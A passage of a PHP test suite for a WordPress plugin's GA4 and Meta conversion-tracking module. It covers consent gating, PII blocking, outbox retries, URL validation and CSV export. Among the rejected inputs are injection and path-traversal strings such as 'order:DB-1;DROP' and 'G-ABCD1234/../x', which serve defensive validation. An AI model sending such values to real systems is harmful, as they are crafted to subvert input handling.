		dbgr_cv_start();
		dbgr_cv_enquiry( 5 );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		do_action( 'doughboss_catering_enquiry_created', 5, DoughBoss_Catering::$rows[5] );
		do_action( 'doughboss_catering_enquiry_created', 5, DoughBoss_Catering::$rows[5] );
		$rows = dbgr_cv_rows();
		assert_same( array( 'ga4', 'meta' ), dbgr_cv_channels(), 'one row per channel, replay did not double' );
		$expected = array(
			'v'          => 1,
			'event'      => 'generate_lead',
			'event_id'   => 'lead:DB-Q-7K2M4X',
			'event_time' => DBGR_TEST_EPOCH,
			'currency'   => 'AUD',
			'form'       => 'catering_enquiry',
			'consent'    => array( 'm' => 1, 'a' => 1, 'v' => '1' ),
		);
		assert_same( dbgr_cv_sorted( $expected ), dbgr_cv_sorted( $rows[0]['payload'] ), 'GA4 lead payload exact' );
		assert_false( isset( $rows[0]['payload']['value_cents'] ) || isset( $rows[0]['payload']['transaction_id'] ), 'a lead carries no value and no transaction' );
		assert_same( 'enquiry', $rows[0]['subject_type'], 'subject type' );
		foreach ( $rows as $row ) {
			dbgr_cv_assert_no_pii( $row['payload_json'], 'lead ' . $row['channel'] );
		}

		dbgr_cv_enquiry( 6, array( 'enquiry_number' => 'DB-Q-NOCONS' ) );
		dbgr_cv_subject( 'enquiry', 6, 0, 0 );
		do_action( 'doughboss_catering_enquiry_created', 6, DoughBoss_Catering::$rows[6] );
		assert_count( 2, dbgr_cv_rows(), 'no consent, no lead event');
		dbgr_cv_enquiry( 7, array( 'enquiry_number' => 'bad number' ) );
		dbgr_cv_subject( 'enquiry', 7, 1, 1 );
		assert_same( array( 'skipped' => 'no_enquiry_number' ), DoughBoss_Growth_Conversions::process_enquiry( 7 ), 'an enquiry number that is not safe in an event id is skipped' );
	}
);

db_test(
	'ordering: the module runs AFTER the attribution record is written at priority 20 (a record written at 20 is visible to it), for orders and enquiries',
	function () {
		dbgr_cv_start();
		add_action(
			'doughboss_catering_enquiry_created',
			function ( $id ) {
				dbgr_cv_subject( 'enquiry', $id, 1, 1 );
			},
			20,
			2
		);
		add_action(
			'doughboss_order_created',
			function ( $id ) {
				dbgr_cv_subject( 'order', $id, 1, 1 );
			},
			20,
			2
		);
		dbgr_cv_enquiry( 5 );
		do_action( 'doughboss_catering_enquiry_created', 5, DoughBoss_Catering::$rows[5] );
		dbgr_cv_order( 17 );
		do_action( 'doughboss_order_created', 17, array() );
		assert_count( 4, dbgr_cv_rows(), 'the lead (2) and the purchase (2) were both queued, so the record already existed' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Payload allow-list and the filter                                                                           */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'allow-list: a good payload passes unchanged for each event; unknown keys are dropped; every malformed variant is refused',
	function () {
		dbgr_cv_start( array( 'hashed' => true ) );
		foreach ( array( 'purchase', 'refund', 'generate_lead' ) as $event ) {
			$good = dbgr_cv_good_payload( $event );
			assert_same( dbgr_cv_sorted( $good ), dbgr_cv_sorted( DoughBoss_Growth_Conversions::validate_payload( $good, 'ga4' ) ), $event . ' passes on GA4' );
		}
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( dbgr_cv_good_payload( 'refund' ), 'meta' ), 'Meta has no refund' );
		$with_extra        = dbgr_cv_good_payload();
		$with_extra['foo'] = 'bar';
		assert_false( array_key_exists( 'foo', DoughBoss_Growth_Conversions::validate_payload( $with_extra, 'ga4' ) ), 'an unknown key is dropped, not passed on' );

		$bad = array(
			'wrong version'          => array( 'v', 2 ),
			'unknown event'          => array( 'event', 'add_to_cart' ),
			'event_id wrong prefix'  => array( 'event_id', 'refund:DB-261002-ABC123' ),
			'event_id not matching'  => array( 'event_id', 'order:DB-OTHER' ),
			'event_id injection'     => array( 'event_id', 'order:DB-1;DROP' ),
			'event_time zero'        => array( 'event_time', 0 ),
			'event_time string'      => array( 'event_time', '1790899200' ),
			'currency USD'           => array( 'currency', 'USD' ),
			'transaction mismatch'   => array( 'transaction_id', 'DB-OTHER' ),
			'value zero'             => array( 'value_cents', 0 ),
			'value negative'         => array( 'value_cents', -1 ),
			'value float'            => array( 'value_cents', 35.99 ),
			'value string'           => array( 'value_cents', '3599' ),
			'value over the cap'     => array( 'value_cents', 100000000 ),
			'consent not an array'   => array( 'consent', 'yes' ),
			'consent bit 2'          => array( 'consent', array( 'm' => 2, 'a' => 1, 'v' => '1' ) ),
			'consent bool'           => array( 'consent', array( 'm' => true, 'a' => 1, 'v' => '1' ) ),
			'consent version spaces' => array( 'consent', array( 'm' => 1, 'a' => 1, 'v' => 'a b' ) ),
			'consent bit missing'    => array( 'consent', array( 'm' => 1, 'v' => '1' ) ),
			'email key'              => array( 'email', 'jane.citizen@example.net' ),
			'name key'               => array( 'name', 'Jane' ),
			'email-shaped value'     => array( 'note', 'jane.citizen@example.net' ),
			'phone key'              => array( 'phone', '0412345678' ),
			'ip key'                 => array( 'ip_address', '203.0.113.9' ),
			'user agent key'         => array( 'client_user_agent', 'Mozilla' ),
			'address key'            => array( 'address', '12 Smith Street' ),
		);
		foreach ( $bad as $label => $change ) {
			$payload              = dbgr_cv_good_payload();
			$payload[ $change[0] ] = $change[1];
			if ( 'note' === $change[0] ) {
				$payload = array_merge( $payload, array( 'extra' => array( 'x' => $change[1] ) ) );
			}
			assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $payload, 'ga4' ), 'refused: ' . $label );
		}
		$lead_with_value                = dbgr_cv_good_payload( 'generate_lead' );
		$lead_with_value['value_cents'] = 100;
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $lead_with_value, 'ga4' ), 'refused: a lead with a value' );
		$lead_bad_form         = dbgr_cv_good_payload( 'generate_lead' );
		$lead_bad_form['form'] = 'waitlist';
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $lead_bad_form, 'ga4' ), 'refused: a waitlist sign-up is never a catering lead conversion' );
		$purchase_with_form         = dbgr_cv_good_payload();
		$purchase_with_form['form'] = 'catering_enquiry';
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $purchase_with_form, 'ga4' ), 'refused: a purchase with a form' );
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( 'text', 'ga4' ), 'not an array' );
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( dbgr_cv_good_payload(), 'webhook' ), 'unknown channel' );
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( array(), 'ga4' ), 'empty' );
	}
);

db_test(
	'allow-list: match keys exist only on Meta, hashes only with the setting on AND advertising consent, and each must have the exact shape',
	function () {
		dbgr_cv_start();
		$fbc  = 'fb.1.1790812800000.AbCdEfGhIj1234567890';
		$hash = str_repeat( 'a', 64 );
		$meta = dbgr_cv_good_payload();
		$meta['fbc'] = $fbc;
		assert_same( $fbc, DoughBoss_Growth_Conversions::validate_payload( $meta, 'meta' )['fbc'], 'a good fbc passes on Meta' );
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $meta, 'ga4' ), 'fbc never goes to GA4' );
		foreach ( array( 'fb.2.1790812800000.AbCdEfGhIj1234567890', 'fb.1.123.AbCdEfGhIj1234567890', 'fb.1.1790812800000.short', 'fb.1.1790812800000.AbCdEf GhIj1234567890', '' ) as $bad_fbc ) {
			$p        = dbgr_cv_good_payload();
			$p['fbc'] = $bad_fbc;
			assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $p, 'meta' ), 'bad fbc refused: ' . $bad_fbc );
		}
		$p       = dbgr_cv_good_payload();
		$p['em'] = $hash;
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $p, 'meta' ), 'a hash while the setting is off is refused' );

		dbgr_cv_start( array( 'hashed' => true ) );
		assert_same( $hash, DoughBoss_Growth_Conversions::validate_payload( $p, 'meta' )['em'], 'a hash with the setting on passes' );
		$p['consent']['a'] = 0;
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $p, 'meta' ), 'a hash without advertising consent is refused' );
		foreach ( array( 'ABCDEF' . str_repeat( 'a', 58 ), str_repeat( 'a', 63 ), str_repeat( 'g', 64 ), 'jane.citizen@example.net' ) as $bad_hash ) {
			$q       = dbgr_cv_good_payload();
			$q['ph'] = $bad_hash;
			assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $q, 'meta' ), 'bad hash refused: ' . substr( $bad_hash, 0, 12 ) );
		}
		$ga4       = dbgr_cv_good_payload();
		$ga4['em'] = $hash;
		assert_same( null, DoughBoss_Growth_Conversions::validate_payload( $ga4, 'ga4' ), 'a hash never goes to GA4, even with the setting on' );
	}
);

db_test(
	'filter doughboss_growth_conversion_payload: receives ( payload, channel, event ); a harmless change passes; personal data, unknown keys, identity and consent changes, bad values and a non-array result are refused or stripped',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 0 );
		$calls = array();
		add_filter(
			'doughboss_growth_conversion_payload',
			function ( $payload, $channel, $event ) use ( &$calls ) {
				$calls[] = array( $channel, $event );
				return $payload;
			},
			10,
			3
		);
		do_action( 'doughboss_order_created', 17, array() );
		assert_same( array( array( 'ga4', 'purchase' ) ), $calls, 'the filter saw the GA4 purchase (Meta had no consent, so it was never offered)' );
		assert_count( 1, dbgr_cv_rows(), 'unchanged payload queued' );

		$scenarios = array(
			'adds an email'          => array( function ( $p ) { $p['email'] = 'jane.citizen@example.net'; return $p; }, 'rejected' ),
			'adds a phone key'       => array( function ( $p ) { $p['phone'] = '0412345678'; return $p; }, 'rejected' ),
			'adds an email value'    => array( function ( $p ) { $p['label'] = array( 'jane.citizen@example.net' ); return $p; }, 'rejected' ),
			'returns null'           => array( function () { return null; }, 'rejected' ),
			'returns a string'       => array( function () { return 'queued'; }, 'rejected' ),
			'returns false'          => array( function () { return false; }, 'rejected' ),
			'changes the event id'   => array( function ( $p ) { $p['event_id'] = 'order:DB-OTHER'; $p['transaction_id'] = 'DB-OTHER'; return $p; }, 'rejected' ),
			'changes the event'      => array( function ( $p ) { $p['event'] = 'refund'; return $p; }, 'rejected' ),
			'raises advertising consent' => array( function ( $p ) { $p['consent']['a'] = 1; return $p; }, 'rejected' ),
			'changes the version'    => array( function ( $p ) { $p['consent']['v'] = '9'; return $p; }, 'rejected' ),
			'value zero'             => array( function ( $p ) { $p['value_cents'] = 0; return $p; }, 'rejected' ),
			'value over the cap'     => array( function ( $p ) { $p['value_cents'] = 100000000; return $p; }, 'rejected' ),
			'value as text'          => array( function ( $p ) { $p['value_cents'] = '3000'; return $p; }, 'rejected' ),
			'adds a match key to GA4' => array( function ( $p ) { $p['fbc'] = 'fb.1.1790812800000.AbCdEfGhIj1234567890'; return $p; }, 'rejected' ),
			'currency changed'       => array( function ( $p ) { $p['currency'] = 'USD'; return $p; }, 'rejected' ),
			'drops a required key'   => array( function ( $p ) { unset( $p['consent'] ); return $p; }, 'rejected' ),
		);
		$id = 400;
		foreach ( $scenarios as $label => $scenario ) {
			$id++;
			remove_all_filters( 'doughboss_growth_conversion_payload' );
			add_filter( 'doughboss_growth_conversion_payload', $scenario[0], 10, 3 );
			dbgr_cv_order( $id, array( 'order_number' => 'DB-261002-F' . $id ) );
			dbgr_cv_subject( 'order', $id, 1, 0 );
			$result = DoughBoss_Growth_Conversions::process_order( $id, 'purchase', '' );
			assert_same( $scenario[1], $result['ga4'], 'filter ' . $label );
		}
		foreach ( dbgr_cv_rows() as $row ) {
			dbgr_cv_assert_no_pii( $row['payload_json'], 'row ' . $row['event_id'] );
		}
		assert_count( 1, dbgr_cv_rows(), 'none of the refused scenarios queued anything' );

		remove_all_filters( 'doughboss_growth_conversion_payload' );
		add_filter( 'doughboss_growth_conversion_payload', function ( $p ) { $p['value_cents'] = 3000; $p['unknown_extra'] = 'x'; return $p; }, 10, 3 );
		dbgr_cv_order( 500, array( 'order_number' => 'DB-261002-OKADJ1' ) );
		dbgr_cv_subject( 'order', 500, 1, 0 );
		assert_same( 'queued', DoughBoss_Growth_Conversions::process_order( 500, 'purchase', '' )['ga4'], 'a value inside the range and an unknown key: queued' );
		$last = dbgr_cv_rows( 'ga4' );
		$last = $last[ count( $last ) - 1 ];
		assert_same( 3000, $last['payload']['value_cents'], 'the adjusted value is used' );
		assert_false( array_key_exists( 'unknown_extra', $last['payload'] ), 'the unknown key was stripped' );
		assert_true( count( preg_grep( '/conversion_payload_refused/', $GLOBALS['dbgr_cv_log'] ) ) > 0, 'a refusal is logged (event and channel only)' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Delivery: GA4 and Meta                                                                                      */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'delivery: the outbox sends GA4 and Meta requests matching the hand-written fixtures (decimal AUD from cents, event ids, consent flags), POST over https, secrets in the right place, exactly two requests',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/mp/collect\?measurement_id=G-TEST1234&api_secret=' . DBGR_CV_GA4_SECRET . '$#', dbgr_test_http_response( 204, '' ), array( 'method' => 'POST' ) );
		dbgr_test_http_expect( 'https://graph.facebook.com/' . DoughBoss_Growth_Meta::API_VERSION . '/123456789012345/events', dbgr_test_http_response( 200, '{"events_received":1}' ), array( 'method' => 'POST' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 2, $summary['claimed'], 'two rows claimed' );
		assert_same( 2, $summary['sent'], 'two rows sent' );
		dbgr_test_http_assert_done( 'both declared requests were made' );
		assert_count( 2, dbgr_test_http_calls(), 'exactly two requests' );

		$ga4 = dbgr_cv_call( 'https://www.google-analytics.com/mp/collect' );
		assert_same( 'POST', $ga4['method'], 'GA4 is a POST' );
		assert_same( 'application/json', $ga4['args']['headers']['Content-Type'], 'JSON content type' );
		$body = json_decode( $ga4['args']['body'], true );
		assert_matches( '/^[0-9]{1,10}\.[0-9]{1,10}$/', $body['client_id'], 'client id has the GA shape' );
		assert_same( DoughBoss_Growth_Ga4::client_id( 'order:DB-261002-ABC123' ), $body['client_id'], 'client id derives from the event id (stable across retries)' );
		unset( $body['client_id'] );
		assert_same( dbgr_cv_sorted( dbgr_cv_expected_body( 'ga4_purchase_advertising_yes' ) ), dbgr_cv_sorted( $body ), 'GA4 body equals the fixture' );
		assert_contains( '"value":35.99', $ga4['args']['body'], 'the value is written as a decimal number' );
		dbgr_cv_assert_no_pii( $ga4['args']['body'], 'GA4 request body', true ); // GA4's own event "name" is the event name, not a person's.

		$meta = dbgr_cv_call( 'https://graph.facebook.com/' );
		assert_same( 'POST', $meta['method'], 'Meta is a POST' );
		assert_same( dbgr_cv_sorted( dbgr_cv_expected_body( 'meta_purchase_fbc' ) ), dbgr_cv_sorted( json_decode( $meta['args']['body'], true ) ), 'Meta body equals the fixture' );
		assert_not_contains( DBGR_CV_META_TOKEN, $meta['url'], 'the token is not in the URL' );
		dbgr_cv_assert_no_pii( $meta['args']['body'], 'Meta request body' );

		foreach ( dbgr_cv_rows() as $row ) {
			assert_same( 'sent', $row['status'], $row['channel'] . ' row is sent' );
			assert_same( '', $row['last_error'], 'no error text' );
		}
		foreach ( $GLOBALS['dbgr_cv_log'] as $line ) {
			assert_not_contains( DBGR_CV_GA4_SECRET, $line, 'no log line holds the GA4 secret' );
			assert_not_contains( DBGR_CV_META_TOKEN, $line, 'no log line holds the Meta token' );
		}
		assert_true( count( $GLOBALS['dbgr_cv_log'] ) > 0, 'the requests were logged (so the secret check is meaningful)' );
	}
);

db_test(
	'delivery: refund and lead bodies match the fixtures; no advertising consent means non_personalized_ads; a Meta lead is a Lead with no custom data',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17, array( 'payment_status' => 'refunded' ) );
		dbgr_cv_subject( 'order', 17, 1, 0 );
		do_action( 'doughboss_order_payment_status_changed', 17, 'paid', 'refunded' );
		dbgr_cv_enquiry( 5 );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		do_action( 'doughboss_catering_enquiry_created', 5, DoughBoss_Catering::$rows[5] );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/mp/collect\?#', dbgr_test_http_response( 204, '' ), array( 'times' => 2 ) );
		dbgr_test_http_expect( 'https://graph.facebook.com/' . DoughBoss_Growth_Meta::API_VERSION . '/123456789012345/events', dbgr_test_http_response( 200, '{}' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 3, $summary['sent'], 'refund, GA4 lead and Meta lead sent' );
		$bodies = array();
		foreach ( dbgr_test_http_calls() as $call ) {
			$decoded = json_decode( $call['args']['body'], true );
			if ( isset( $decoded['client_id'] ) ) {
				unset( $decoded['client_id'] );
				$bodies[ $decoded['events'][0]['name'] ] = $decoded;
			} else {
				$bodies['meta'] = $decoded;
			}
		}
		assert_same( dbgr_cv_sorted( dbgr_cv_expected_body( 'ga4_refund' ) ), dbgr_cv_sorted( $bodies['refund'] ), 'GA4 refund body' );
		assert_same( dbgr_cv_sorted( dbgr_cv_expected_body( 'ga4_lead' ) ), dbgr_cv_sorted( $bodies['generate_lead'] ), 'GA4 lead body' );
		assert_same( dbgr_cv_sorted( dbgr_cv_expected_body( 'meta_lead_fbc' ) ), dbgr_cv_sorted( $bodies['meta'] ), 'Meta lead body' );
	}
);

db_test(
	'delivery: failures follow the outbox contract (5xx and transport errors retry with backoff, 4xx is terminal, success after a retry is sent) and no error text carries a secret',
	function () {
		dbgr_cv_start( array( 'features' => array() ) );
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 0 );
		do_action( 'doughboss_order_created', 17, array() );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/#', dbgr_test_http_response( 503, 'busy ' . DBGR_CV_GA4_SECRET ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['retried'], '503 retries' );
		$row = dbgr_cv_rows( 'ga4' )[0];
		assert_same( 'pending', $row['status'], 'back to pending' );
		assert_same( 1, (int) $row['attempts'], 'one attempt' );
		assert_same( 'http_503', $row['last_error'], 'error code only' );
		assert_same( gmdate( 'Y-m-d H:i:s', DBGR_TEST_EPOCH + 60 ), $row['next_attempt_at'], 'first backoff is 60 seconds' );
		assert_not_contains( DBGR_CV_GA4_SECRET, wp_json_encode( $row ), 'the row holds no secret' );

		$summary = dbgr_cv_dispatch();
		assert_same( 0, $summary['claimed'], 'not due yet' );

		dbgr_test_advance( 61 );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/#', new WP_Error( 'http_request_failed', 'cURL error' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['retried'], 'a transport error retries' );
		assert_same( 'transport_error', dbgr_cv_rows( 'ga4' )[0]['last_error'], 'transport_error' );

		dbgr_test_advance( 301 );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/#', dbgr_test_http_response( 204, '' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['sent'], 'a later success is sent' );
		assert_same( 'sent', dbgr_cv_rows( 'ga4' )[0]['status'], 'sent' );

		dbgr_cv_order( 18, array( 'order_number' => 'DB-261002-TERM01' ) );
		dbgr_cv_subject( 'order', 18, 1, 0 );
		do_action( 'doughboss_order_created', 18, array() );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/#', dbgr_test_http_response( 400, 'bad' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['terminal'], '400 is terminal' );
		$terminal = dbgr_cv_rows( 'ga4' );
		assert_same( 'failed_terminal', $terminal[1]['status'], 'parked' );
		assert_same( 'http_400', $terminal[1]['last_error'], 'http_400' );
	}
);

db_test(
	'delivery guards: a row whose payload says no measurement consent (GA4) or no advertising consent (Meta) is terminal and makes ZERO requests; so is a malformed payload',
	function () {
		dbgr_cv_start();
		$ga4_no  = dbgr_cv_good_payload();
		$ga4_no['consent']['m'] = 0;
		$meta_no = dbgr_cv_good_payload();
		$meta_no['event_id']       = 'order:DB-261002-ABC124';
		$meta_no['transaction_id'] = 'DB-261002-ABC124';
		$meta_no['consent']['a']   = 0;
		$meta_no['fbc']            = 'fb.1.1790812800000.AbCdEfGhIj1234567890';
		$bad                       = dbgr_cv_good_payload();
		$bad['event_id']           = 'order:DB-261002-ABC125';
		$bad['transaction_id']     = 'DB-261002-ABC125';
		$bad['value_cents']        = -5;
		assert_same( 'queued', DoughBoss_Growth_Outbox::enqueue( 'ga4', 'purchase', $ga4_no['event_id'], 'order', '1', $ga4_no ), 'planted GA4 row without measurement consent' );
		assert_same( 'queued', DoughBoss_Growth_Outbox::enqueue( 'meta', 'purchase', $meta_no['event_id'], 'order', '2', $meta_no ), 'planted Meta row without advertising consent' );
		assert_same( 'queued', DoughBoss_Growth_Outbox::enqueue( 'ga4', 'purchase', $bad['event_id'], 'order', '3', $bad ), 'planted malformed row' );
		$summary = dbgr_cv_dispatch();
		assert_same( 3, $summary['terminal'], 'all three are parked' );
		assert_same( array(), dbgr_test_http_calls(), 'ZERO requests were made' );
		$errors = array();
		foreach ( dbgr_cv_rows() as $row ) {
			$errors[ $row['event_id'] ] = $row['last_error'];
		}
		assert_same( 'consent_missing', $errors['order:DB-261002-ABC123'], 'GA4 without measurement consent' );
		assert_same( 'consent_missing', $errors['order:DB-261002-ABC124'], 'Meta without advertising consent' );
		assert_same( 'bad_payload', $errors['order:DB-261002-ABC125'], 'malformed payload' );
	}
);

db_test(
	'delivery guards: a missing secret retries without any request; a Meta event older than the platform allows is terminal; GA4 omits the timestamp when too old',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		dbgr_cv_env( array( 'DOUGHBOSS_GROWTH_META_CAPI_TOKEN' => DBGR_CV_META_TOKEN ) ); // The GA4 secret disappears after queueing.
		dbgr_test_http_expect( 'https://graph.facebook.com/' . DoughBoss_Growth_Meta::API_VERSION . '/123456789012345/events', dbgr_test_http_response( 200, '{}' ) );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['sent'], 'Meta still goes' );
		assert_same( 1, $summary['retried'], 'GA4 retries' );
		assert_same( 'not_configured', dbgr_cv_rows( 'ga4' )[0]['last_error'], 'not_configured' );
		assert_count( 1, dbgr_test_http_calls(), 'only the Meta request was made' );

		$old               = dbgr_cv_good_payload();
		$old['event_id']   = 'order:DB-261002-OLD001';
		$old['transaction_id'] = 'DB-261002-OLD001';
		$old['event_time'] = DBGR_TEST_EPOCH - ( 8 * 86400 );
		$old['fbc']        = 'fb.1.1790812800000.AbCdEfGhIj1234567890';
		DoughBoss_Growth_Outbox::enqueue( 'meta', 'purchase', $old['event_id'], 'order', '9', $old );
		$summary = dbgr_cv_dispatch();
		assert_same( 1, $summary['terminal'], 'an 8-day-old event is parked' );
		$rows = dbgr_cv_rows( 'meta' );
		assert_same( 'event_too_old', $rows[1]['last_error'], 'event_too_old' );
		assert_count( 1, dbgr_test_http_calls(), 'still no new request' );

		$stale               = dbgr_cv_good_payload();
		$stale['event_time'] = DBGR_TEST_EPOCH - ( 80 * 3600 );
		assert_false( array_key_exists( 'timestamp_micros', DoughBoss_Growth_Ga4::build_body( $stale ) ), '80-hour-old GA4 event: no timestamp (the platform would reject it)' );
		$fresh               = dbgr_cv_good_payload();
		$fresh['event_time'] = DBGR_TEST_EPOCH - ( 60 * 3600 );
		assert_same( $fresh['event_time'] * 1000000, DoughBoss_Growth_Ga4::build_body( $fresh )['timestamp_micros'], '60-hour-old: timestamp kept' );
		assert_same( null, DoughBoss_Growth_Ga4::build_body( array_merge( dbgr_cv_good_payload(), array( 'event' => 'view_item' ) ) ), 'not a GA4 event' );
		assert_same( null, DoughBoss_Growth_Meta::build_body( dbgr_cv_good_payload(), 'tok' ), 'Meta body needs a match key' );
	}
);

db_test(
	'delivery: URLs are built from validated ids, never from raw input; a malformed id or empty secret yields no URL',
	function () {
		assert_same( 'https://www.google-analytics.com/mp/collect?measurement_id=G-ABCD1234&api_secret=s3cr3t', DoughBoss_Growth_Ga4::endpoint( 'G-ABCD1234', 's3cr3t' ), 'GA4 URL' );
		assert_same( 'https://www.google-analytics.com/mp/collect?measurement_id=G-ABCD1234&api_secret=a%26b%3Dc', DoughBoss_Growth_Ga4::endpoint( 'G-ABCD1234', 'a&b=c' ), 'the secret is URL-encoded' );
		foreach ( array( 'g-abcd1234', 'G-AB', 'G-ABCD1234&x=1', 'GTM-ABCD123', '', 'G-ABCD1234/../x' ) as $bad ) {
			assert_same( '', DoughBoss_Growth_Ga4::endpoint( $bad, 'x' ), 'GA4 refuses id ' . $bad );
		}
		assert_same( '', DoughBoss_Growth_Ga4::endpoint( 'G-ABCD1234', '' ), 'no secret, no URL' );
		assert_same( 'https://graph.facebook.com/' . DoughBoss_Growth_Meta::API_VERSION . '/123456789012345/events', DoughBoss_Growth_Meta::endpoint( '123456789012345' ), 'Meta URL' );
		foreach ( array( '1234567', '12345678/../x', 'abc', '', '123456789012345678901' ) as $bad ) {
			assert_same( '', DoughBoss_Growth_Meta::endpoint( $bad ), 'Meta refuses pixel id ' . $bad );
		}
		assert_true( DoughBoss_Growth_Http::url_allowed( DoughBoss_Growth_Ga4::endpoint( 'G-ABCD1234', 'x' ) ), 'the GA4 URL passes the outbound policy' );
		assert_true( DoughBoss_Growth_Http::url_allowed( DoughBoss_Growth_Meta::endpoint( '123456789012345' ) ), 'the Meta URL passes the outbound policy' );
		assert_same( DoughBoss_Growth_Ga4::client_id( 'order:A' ), DoughBoss_Growth_Ga4::client_id( 'order:A' ), 'client id is stable' );
		assert_true( DoughBoss_Growth_Ga4::client_id( 'order:A' ) !== DoughBoss_Growth_Ga4::client_id( 'order:B' ), 'and differs per event' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Failure paths: nothing reaches core                                                                         */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'failure paths: a throwing core accessor, a database error on read, and a database error on write never throw into core and queue nothing',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );

		DoughBoss_Order::$throw = true;
		do_action( 'doughboss_order_created', 17, array() );
		do_action( 'doughboss_order_payment_status_changed', 17, 'unpaid', 'paid' );
		DoughBoss_Order::$throw = false;
		assert_same( array(), dbgr_cv_rows(), 'a throwing order lookup queued nothing' );
		assert_true( count( preg_grep( '/conversions_failed/', $GLOBALS['dbgr_cv_log'] ) ) >= 2, 'logged as stage and class only' );
		foreach ( $GLOBALS['dbgr_cv_log'] as $line ) {
			dbgr_cv_assert_no_pii( $line, 'log line' );
		}

		dbgr_cv_enquiry( 5 );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		DoughBoss_Catering::$throw = true;
		do_action( 'doughboss_catering_enquiry_created', 5, array() );
		DoughBoss_Catering::$throw = false;
		assert_same( array(), dbgr_cv_rows(), 'a throwing enquiry lookup queued nothing' );

		$GLOBALS['wpdb']->fail_on( '/FROM wp_doughboss_growth_attribution/' );
		assert_same( array( 'ga4' => 'read_failed', 'meta' => 'read_failed' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'an unreadable consent record is read_failed (the event is dropped and the failure listed), never no_consent' );
		assert_same( array(), dbgr_cv_rows(), 'and nothing was queued (fail closed)' );
		$GLOBALS['wpdb']->clear_failures();

		$GLOBALS['wpdb']->fail_on( '/INSERT IGNORE INTO wp_doughboss_growth_outbox/' );
		assert_same( array( 'ga4' => 'error', 'meta' => 'error' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'a failed insert reports error and does not throw' );
		$GLOBALS['wpdb']->clear_failures();
		assert_same( array(), dbgr_cv_rows(), 'nothing was stored');
		assert_true( count( preg_grep( '/conversion_enqueue_failed/', $GLOBALS['dbgr_cv_log'] ) ) >= 1, 'the storage failure is logged without data' );
		assert_same( array(), dbgr_test_http_calls(), 'no HTTP in any failure path' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Offline export                                                                                              */
/* ---------------------------------------------------------------------------------------------------------- */

/** Parse the export CSV into rows (header first). */
function dbgr_cv_csv_rows( $csv ) {
	$lines = array_values( array_filter( explode( "\r\n", $csv ), 'strlen' ) );
	$rows  = array();
	foreach ( $lines as $line ) {
		$rows[] = str_getcsv( $line, ',', '"', '' );
	}
	return $rows;
}

/** Window used by the export tests. */
function dbgr_cv_window() {
	return array(
		DoughBoss_Growth_Offline_Export::parse_date( '2026-09-01', false ),
		DoughBoss_Growth_Offline_Export::parse_date( '2026-10-31', true ),
	);
}

db_test(
	'export: header, UTC time with offset converted from the Sydney site time (AEST and AEDT), value from the enquiry total, AUD, order id = enquiry number; sorted by time',
	function () {
		dbgr_cv_start();
		dbgr_cv_enquiry( 5, array( 'enquiry_number' => 'DB-Q-AAAAAA', 'quoted_at' => '2026-09-28 09:15:00', 'balance_paid_at' => '2026-10-14 15:30:00', 'status' => 'paid', 'quote_total' => '1250.50' ) );
		dbgr_cv_subject( 'enquiry', 5, 0, 1, array( 'gclid' => 'Cj0KCQjwTESTCLICKID1234' ) );
		list( $from, $to ) = dbgr_cv_window();
		$result            = DoughBoss_Growth_Offline_Export::build( 'both', $from, $to );
		assert_true( is_array( $result ), 'built' );
		assert_same( 2, $result['rows'], 'a quote row and a won row' );
		$rows = dbgr_cv_csv_rows( $result['csv'] );
		assert_same( array( 'Google Click ID', 'Conversion Name', 'Conversion Time', 'Conversion Value', 'Conversion Currency', 'Order ID' ), $rows[0], 'header' );
		assert_same( array( 'Cj0KCQjwTESTCLICKID1234', 'Catering quote sent', '2026-09-27 23:15:00+0000', '1250.50', 'AUD', 'DB-Q-AAAAAA' ), $rows[1], 'quoted row: 09:15 AEST (+10) is 23:15 UTC the day before' );
